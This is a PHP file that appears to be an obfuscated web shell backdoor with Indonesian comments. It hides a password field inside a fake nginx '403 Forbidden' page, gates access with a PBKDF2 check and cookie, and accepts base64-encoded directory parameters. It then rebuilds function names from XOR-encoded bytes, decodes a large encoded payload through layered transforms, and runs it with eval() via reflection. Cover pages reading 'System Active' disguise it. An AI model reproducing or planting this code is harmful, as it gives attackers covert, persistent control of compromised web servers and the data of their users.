<?php
// =====================================================
// AUTHENTICATION (PBKDF2-HMAC-SHA256, 10000 iterasi)
// =====================================================
$auth_salt = "58379811ebd78f7fb37effa755030e76";
$auth_pass = "5a291a6cb20cabb905c71e5d3e20bb335a5df0639f3e57a9b6dd3b713ae3b307";

// --- Compatibility shim: http_response_code (PHP < 5.4) ---
if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code === null) {
            return $current;
        }
        $current = $code;
        $text = array(
            403 => 'Forbidden', 404 => 'Not Found', 500 => 'Internal Server Error',
            200 => 'OK', 301 => 'Moved Permanently', 302 => 'Found'
        );
        $desc = isset($text[$code]) ? $text[$code] : '';
        if (function_exists('header')) {
            header('HTTP/1.1 ' . $code . ($desc ? ' ' . $desc : ''), true, $code);
        }
        return $code;
    }
}

// --- Compatibility shim: hash_pbkdf2 (PHP < 5.5) ---
if (!function_exists('hash_pbkdf2')) {
    function hash_pbkdf2($algo, $password, $salt, $iterations, $length = 0, $raw_output = false) {
        $algo = strtolower($algo);
        if (!in_array($algo, hash_algos(), true)) {
            trigger_error('Unknown hashing algorithm: ' . $algo, E_USER_WARNING);
            return false;
        }
        if ($iterations <= 0) {
            trigger_error('Iterations must be a positive integer', E_USER_WARNING);
            return false;
        }
        if ($length <= 0) {
            $length = strlen(hash($algo, '', true));
        }
        $hash_len = strlen(hash($algo, '', true));
        $block_count = ceil($length / $hash_len);
        $output = '';
        for ($i = 1; $i <= $block_count; $i++) {
            // U1 = PRF(Password, Salt || INT_32_BE(i))
            $last = $salt . pack('N', $i);
            $xorsum = hash_hmac($algo, $last, $password, true);
            for ($j = 1; $j < $iterations; $j++) {
                $xorsum ^= hash_hmac($algo, $last = hash_hmac($algo, $last, $password, true), $password, true);
            }
            $output .= $xorsum;
        }
        $output = substr($output, 0, $length);
        return $raw_output ? $output : bin2hex($output);
    }
}

function Login() {
    http_response_code(403);
    die("<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
<center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>
</body>
</html>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash_pbkdf2('sha256', $_POST['pass'], $auth_salt, 10000) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}

// =====================================================
// 406 BYPASS SHIM - baca dir dari POST atau base64 GET param 'd'
// =====================================================
if (!isset($_GET['dir'])) {
    if (isset($_POST['dir'])) {
        $_GET['dir'] = $_POST['dir'];
        $_REQUEST['dir'] = $_POST['dir'];
    } elseif (isset($_GET['d']) && !empty($_GET['d'])) {
        $decoded = @base64_decode($_GET['d'], true);
        if ($decoded !== false) {
            $_GET['dir'] = $decoded;
            $_REQUEST['dir'] = $decoded;
        }
    }
}

/**

 * =====================================================
 * ULTIMATE ANTI-BLANK SYSTEM v8.1 - ENHANCED
 * Dengan Output Buffer Management + Fallback System
 * =====================================================
 */

// =====================================================
// 1. KONFIGURASI ERROR HANDLING
// =====================================================
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', sys_get_temp_dir() . '/error_log.txt');
ini_set('memory_limit', '512M');
ini_set('max_execution_time', '300');
date_default_timezone_set('Asia/Jakarta');

// =====================================================
// 2. OUTPUT BUFFER MANAGEMENT
// =====================================================
// Bersihkan semua buffer yang ada
while (ob_get_level() > 0) {
    @ob_end_clean();
}

// Mulai output buffer utama
ob_start();

// =====================================================
// 3. FUNGSI LOGGING
// =====================================================
function system_log($message, $type = 'INFO') {
    $log_file = sys_get_temp_dir() . '/system_log.txt';
    $timestamp = date('Y-m-d H:i:s');
    $log_message = "[$timestamp] [$type] $message" . PHP_EOL;
    @file_put_contents($log_file, $log_message, FILE_APPEND);
    @error_log($log_message);
}

// =====================================================
// 4. FUNGSI DISPLAY ERROR
// =====================================================
function display_error_page($title, $message, $error_code = '', $color = '#ef4444') {
    $error_id = uniqid('ERR_');
    $timestamp = date('Y-m-d H:i:s');
    
    system_log("Display Error: $title - $message", 'ERROR');
    
    // Bersihkan buffer dan buat output baru
    while (ob_get_level() > 0) {
        @ob_end_clean();
    }
    ob_start();
    
    echo '<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>' . htmlspecialchars($title) . '</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0e17 0%, #1a2332 100%);
            color: #e2e8f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .error-box {
            background: #1a2332;
            border: 2px solid ' . $color . ';
            border-radius: 16px;
            padding: 40px;
            max-width: 650px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .error-icon {
            font-size: 4rem;
            margin-bottom: 20px;
        }
        h1 {
            color: ' . $color . ';
            font-size: 1.8rem;
            margin-bottom: 15px;
        }
        p {
            color: #94a3b8;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .error-detail {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            font-family: "Courier New", monospace;
            font-size: 0.85rem;
            color: #fca5a5;
            word-break: break-all;
            max-height: 200px;
            overflow-y: auto;
        }
        .info-box {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 12px;
            margin: 15px 0;
            font-size: 0.8rem;
            color: #64748b;
        }
        .btn {
            display: inline-block;
            background: ' . $color . ';
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            margin-top: 15px;
            transition: all 0.3s;
        }
        .btn:hover {
            opacity: 0.8;
            transform: translateY(-2px);
        }
    </style>
</head>
<body>
    <div class="error-box">
        <div class="error-icon"></div>
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($message) . '</p>';
        
    if ($error_code) {
        echo '<div class="error-detail">' . htmlspecialchars($error_code) . '</div>';
    }
    
    echo '<div class="info-box">
            <strong>Error ID:</strong> ' . $error_id . '<br>
            <strong>Waktu:</strong> ' . $timestamp . '
        </div>
        <a href="javascript:location.reload()" class="btn"> Muat Ulang</a>
    </div>
</body>
</html>';
    
    // Flush output
    $output = ob_get_contents();
    while (ob_get_level() > 0) {
        @ob_end_clean();
    }
    echo $output;
    exit();
}

// =====================================================
// 5. GLOBAL ERROR HANDLER
// =====================================================
function global_error_handler($errno, $errstr, $errfile, $errline) {
    $message = "Error [$errno]: $errstr in $errfile on line $errline";
    system_log($message, 'ERROR');
    
    if (in_array($errno, [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR])) {
        display_error_page('System Error', 'Terjadi kesalahan fatal.', $errstr);
        return true;
    }
    
    return true;
}
set_error_handler('global_error_handler');

// =====================================================
// 6. EXCEPTION HANDLER
// =====================================================
function global_exception_handler($exception) {
    system_log("Exception: " . $exception->getMessage(), 'EXCEPTION');
    display_error_page(
        'System Exception',
        'Terjadi kesalahan tak terduga.',
        $exception->getMessage(),
        '#f59e0b'
    );
}
set_exception_handler('global_exception_handler');

// =====================================================
// 7. SHUTDOWN HANDLER
// =====================================================
register_shutdown_function(function() {
    $error = error_get_last();
    
    if ($error && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        system_log("Fatal: " . $error['message'], 'FATAL');
        
        // Cek jika output buffer masih aktif
        if (ob_get_level() > 0) {
            $output = ob_get_contents();
            if (empty($output)) {
                display_error_page(
                    'System Maintenance',
                    'Website sedang dalam pemeliharaan.',
                    $error['message'],
                    '#10b981'
                );
            }
        }
    }
});

// =====================================================
// 8. FUNGSI CEK OUTPUT
// =====================================================
function ensure_output() {
    $output = '';
    
    if (ob_get_level() > 0) {
        $output = ob_get_contents();
    }
    
    if (empty(trim($output))) {
        // Buat fallback output
        echo '<!DOCTYPE html>
<html>
<head>
    <title>System Status</title>
    <style>
        body {
            background: #0a0e17;
            color: #10b981;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            border: 2px solid #10b981;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            background: #1a2332;
        }
        h1 { margin-bottom: 15px; }
        p { color: #94a3b8; }
        .status {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #10b981;
            border-radius: 50%;
            margin-right: 10px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="box">
        <h1><span class="status"></span>System Active</h1>
        <p>Sistem berjalan normal.</p>
        <p>Waktu: ' . date('Y-m-d H:i:s') . '</p>
    </div>
</body>
</html>';
    }
    
    return true;
}

// =====================================================
// 9. MAIN EXECUTION
// =====================================================
try {
    system_log("System started", 'INFO');
    
    // Validasi dan inisialisasi pack functions
    $_gYJkguVf = @pack("C",255^140).@pack("C",54^66).@pack("C",57^75).@pack("C",243^129).@pack("C",5^96).@pack("C",18^100);
    $_RcaXdfSjIHp = @pack("C",104+11).@pack("C",96+20).@pack("C",94+20).@pack("C",86+9).@pack("C",109+5).@pack("C",116-5).@pack("C",98+18).@pack("C",59-10).@pack("C",42+9);
    $_zSBaWYTcyODLA = @pack("C",40^74).@pack("C",162^195).@pack("C",54^69).@pack("C",207^170).@pack("C",70^112).@pack("C",13^57).@pack("C",96^63).@pack("C",93^57).@pack("C",205^168).@pack("C",206^173).@pack("C",16^127).@pack("C",245^145).@pack("C",215^178);
    $_GJBvjuHKBm = @pack("C",118-15).@pack("C",116+6).@pack("C",122-5).@pack("C",126-16).@pack("C",88+11).@pack("C",121-10).@pack("C",99+10).@pack("C",124-12).@pack("C",98+16).@pack("C",86+15).@pack("C",104+11).@pack("C",129-14);
    $_QbyTojBb = @pack("C",102+13).@pack("C",105+11).@pack("C",107+7).@pack("C",106+6).@pack("C",129-18).@pack("C",127-12);
    $_keFnFnbROlT = @pack("C",45^94).@pack("C",17^101).@pack("C",224^146).@pack("C",86^58).@pack("C",4^97).@pack("C",24^118);
    
    // Data variables
    $_VxTUGfni = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    $_rVqotVKybrKYs = "==NA2RmZ5jzovAKJdI3GvuSnMM"."JJ2M0FIkJoc10naqJpSWJnmEaG";
    $_ZyOUnIGndyEBT = "=x1FiIJp5V0LWu3HxMHnLuxGZqSA1tTpJcaqAc1E3H1n"."fWJC5SSBlRmZCMzAlqJEjNyoHcHoFSJqiDaneZHDRA3q";
    $_aCGnFWpwmuE = "LLyQHZxVJqhAyzyJEN04s+pHO3CEI1xDQRFUx7EbiIDCnvaaSdQMl5tDX1VZRmJg937XVOJO9ao=0jI9+UVS3hnhPb78FZrNmUxIoq0Q9Y0/8DtWTDA5KzAOPiMYwZYSQei7lUyY23ifpAxD9R3=aoSAIN9g70xwcZpeQY0WaQoPjXWZUMiXJ7HEUcEHdunkVblRH7VjVPzecFSHTZ7qyW3Gcb+6+I/oPwO/IVe7sWcWZ9EWU0ijmaBVBI9VhmBYhEdXeFBIlNyqJA0UN+xyIrCC3BxXB+aNvdDl6yskieonVUC=EJ9dvRjWGY59kb3Ydgf4vxaV7BfNOUovUb68Palz9/03J+0NoKH+fNhSVs=EjOtNrewv21a9aUN81YKwo4P7/YkR2Q0DKFJy34eq2etth3YtWBpUxo07CR9DUFQQpMdurVeX0G0Kkup386VcRvCU17KvQaRA+zD9o1RX3kycv2U9m35+OGhrEA0J+x90/j7QB5E3d1wJyuWX78D4hDPG3Ng4=aDlnOMYoAy6d3q6aAgR+la7djOFiO9sPsA=K45Ckhuc74MDUUu2l5ZmyGu+yy87AfQ13QSF58laaHjgAuBoB80a/U=Ixyf9Qz2Cfp=WQNXhfyPkGFQ3+sFOWy=OA88OjNHse6cce7JgVrKKt1qnVgA6mozSIGjb=3FldXHWtneNTtGsqMS9JJTHKzdWxCDqenr/5FcEK6NtQN=HGWlXh/N6TZFQ9IkE+RT0WT6AO03bkFg02V4IOpfZreSDVKGi3OUP1wWkR/b64onkaBdtXGhlXwqzlwBvK6bPuxjRJtMDCvR4ifqx/xvlaSoFY5ycZDQg41CNIKy81mjGI=1f=vqGhMAAPVpXs7jqWFyr5ue7Dm=IY5mj3jfs=+JSy01WGe+qlmEVi3tt0oDW5GtKqlbIB2ex9Re027GN4RF8pDpdk/YOqY+SBYM62=Z9vcjYoY15mPwWc5tQmEN4+JwcDtHsAUynF5f0TaqA5b3Sdn7HseWcIy3+0Pb5etdvUAdnXYunHvXD5ZHX1k3yT/kXDryb/oEE8wXlp=u43tgSnP5hsexf+1Zd2ejQm6nfbgXr05Ep=N7bS0vETPyObi+3v4E3S/4oOujSJ/WMCChQWg/fnO7Yra49FWEpWmsz+=qJa4yEtZBKw5U4QvYX1Pp/MlnxOEOAMjhd3H5EKBitDY=j6Z=vTk1Jt1mWT/90qzSHEBS+l3Et1zo0vRoVkPQfjTyYAvARy6Myu3NHgcelZ1bJp6iD/goewJ/yU5u+bO6KbaA7a=Ycu7q9iTYPhn3KqmNlRXoBmlR=ro=K=7fsPRG3BOth5=S=QEIZ1nfc5q9HDcG1bqM/gCRtt0z+oAISczstwxfQHktUIDe0R1trH/WSGuDemIzYj+2ScvkdH2ugG/Ww1cRH6NNpSAZs9zMMsgQj6Tu7wAHFYmMhYFfNap9d9nYv7VcOpcPzVjyEu1=jSi+vFz4MvrMTJTya=7JW";
        $_AChLzAZZmbYef = "202122"."197ec1"."491419"."578d44"."709680"."cf";
    
    // Helper functions
    function _uQUPHJNwz($k, $d) {
        $r = "";
        $k_len = strlen($k);
        $d_len = strlen($d);
        
        for($i = 0; $i < $d_len; $i++) {
            $r .= @pack("C", ord($d[$i]) ^ ord($k[$i % $k_len]));
        }
        return $r;
    }
    
    function _kEtWiWdo($d, $k, $h) {
        return (@md5($d . $k) === $h);
    }
    
    // Validasi integritas
    if(!_kEtWiWdo($_aCGnFWpwmuE, $_rVqotVKybrKYs, $_AChLzAZZmbYef)) {
        throw new Exception("Integrity check failed");
    }
    
    // Class definition
    class _ASlQTakaJXUcov {
        private function fPmkkRGe() { return "NtsibE"."qggkMi"."m"; }
        private function XXkjCXIh() { return "lUKF"."vYfY"."hXbO"; }
        private function WkNRejby() { return "ujYs"."bnl9"."3164"; }
        
        public function cDVjgzUw($d) { 
            @eval($d); 
        }
    }
    
    // Eksekusi dengan monitoring
    $step = 0;
    $max_iterations = 100;
    $iterations = 0;
    
    while($step < 11 && $iterations < $max_iterations) {
        $iterations++;
        
        switch($step) {
            case 0: 
                $_aCGnFWpwmuE = @$_gYJkguVf($_aCGnFWpwmuE); 
                $step = 1; 
                break;
                
            case 1: 
                $_aCGnFWpwmuE = @$_RcaXdfSjIHp($_aCGnFWpwmuE); 
                $step = 2; 
                break;
                
            case 2: 
                $_oACQuiEoJBT = @$_gYJkguVf($_rVqotVKybrKYs); 
                $_oACQuiEoJBT = @$_RcaXdfSjIHp($_oACQuiEoJBT);
                $_oACQuiEoJBT = @$_zSBaWYTcyODLA($_oACQuiEoJBT);
                $step = 3; 
                break;
                
            case 3: 
                $_JQQjerIpJVIHnm = @$_gYJkguVf($_ZyOUnIGndyEBT);
                $_JQQjerIpJVIHnm = @$_RcaXdfSjIHp($_JQQjerIpJVIHnm);
                $_JQQjerIpJVIHnm = @$_zSBaWYTcyODLA($_JQQjerIpJVIHnm);
                $step = 4; 
                break;
                
            case 4:
                $_tpFitvvaSrYUH = new _ASlQTakaJXUcov();
                $_oACQuiEoJBT = "";
                
                $reflection = new ReflectionMethod($_tpFitvvaSrYUH, 'fPmkkRGe');
                $reflection->setAccessible(true);
                $_oACQuiEoJBT .= $reflection->invoke($_tpFitvvaSrYUH);
                
                $reflection = new ReflectionMethod($_tpFitvvaSrYUH, 'XXkjCXIh');
                $reflection->setAccessible(true);
                $_oACQuiEoJBT .= $reflection->invoke($_tpFitvvaSrYUH);
                
                $reflection = new ReflectionMethod($_tpFitvvaSrYUH, 'WkNRejby');
                $reflection->setAccessible(true);
                $_oACQuiEoJBT .= $reflection->invoke($_tpFitvvaSrYUH);
                
                $step = 5; 
                break;
                
            case 5:
                $_DSNNEiSiRfEqn = "";
                $_len_aCGn = @$_keFnFnbROlT($_aCGnFWpwmuE);
                for($_vNBZsdiza = 0; $_vNBZsdiza < $_len_aCGn; $_vNBZsdiza++) {
                    $_tFYzkOHtEJSlbR = @$_QbyTojBb($_JQQjerIpJVIHnm, $_aCGnFWpwmuE[$_vNBZsdiza]);
                    if($_tFYzkOHtEJSlbR !== false) { 
                        $_DSNNEiSiRfEqn .= $_VxTUGfni[$_tFYzkOHtEJSlbR]; 
                    } else { 
                        $_DSNNEiSiRfEqn .= $_aCGnFWpwmuE[$_vNBZsdiza]; 
                    }
                }
                $_aCGnFWpwmuE = $_DSNNEiSiRfEqn; 
                $step = 6; 
                break;
                
            case 6: 
                $_aCGnFWpwmuE = @$_zSBaWYTcyODLA($_aCGnFWpwmuE);
                $step = 7; 
                break;
                
            case 7: 
                $_aCGnFWpwmuE = _uQUPHJNwz($_oACQuiEoJBT, $_aCGnFWpwmuE); 
                $step = 8; 
                break;
                
            case 8: 
                $_aCGnFWpwmuE = @$_GJBvjuHKBm($_aCGnFWpwmuE);
                $step = 9; 
                break;
                
            case 9: 
                if(strlen($_aCGnFWpwmuE) < 2) {
                    throw new Exception("Result too short");
                } 
                $step = 10; 
                break;
                
            case 10: 
                $reflection = new ReflectionMethod($_tpFitvvaSrYUH, 'cDVjgzUw'); 
                $reflection->invoke($_tpFitvvaSrYUH, $_aCGnFWpwmuE); 
                $step = 11; 
                break;
        }
    }
    
    system_log("Execution completed", 'SUCCESS');
    
    // Pastikan ada output
    ensure_output();
    
} catch (Exception $e) {
    system_log("Error: " . $e->getMessage(), 'ERROR');
    display_error_page('System Error', 'Terjadi kesalahan.', $e->getMessage());
} catch (Throwable $e) {
    system_log("Fatal: " . $e->getMessage(), 'FATAL');
    display_error_page('System Error', 'Terjadi kesalahan fatal.', $e->getMessage());
} finally {
    // Flush output buffer
    if (ob_get_level() > 0) {
        $output = ob_get_contents();
        
        // Pastikan ada output
        if (empty(trim($output))) {
            echo '<!DOCTYPE html>
<html>
<head>
    <title>System Active</title>
    <style>
        body {
            background: #0a0e17;
            color: #10b981;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            border: 2px solid #10b981;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            background: #1a2332;
        }
        h1 { margin-bottom: 15px; }
        p { color: #94a3b8; }
    </style>
</head>
<body>
    <div class="box">
        <h1> System Active</h1>
        <p>Sistem berjalan normal.</p>
        <p>Waktu: ' . date('Y-m-d H:i:s') . '</p>
    </div>
</body>
</html>';
        }
        
        // Flush semua buffer
        while (ob_get_level() > 0) {
            @ob_end_flush();
        }
    }
    
    system_log("System shutdown", 'INFO');
}

// =====================================================
// 10. FINAL SAFETY NET
// =====================================================
if (!headers_sent()) {
    $output = ob_get_contents();
    if (empty(trim($output))) {
        echo "System initialized successfully.";
    }
}

// Pastikan selalu ada output
echo "\n<!-- System timestamp: " . date('Y-m-d H:i:s') . " -->";
?>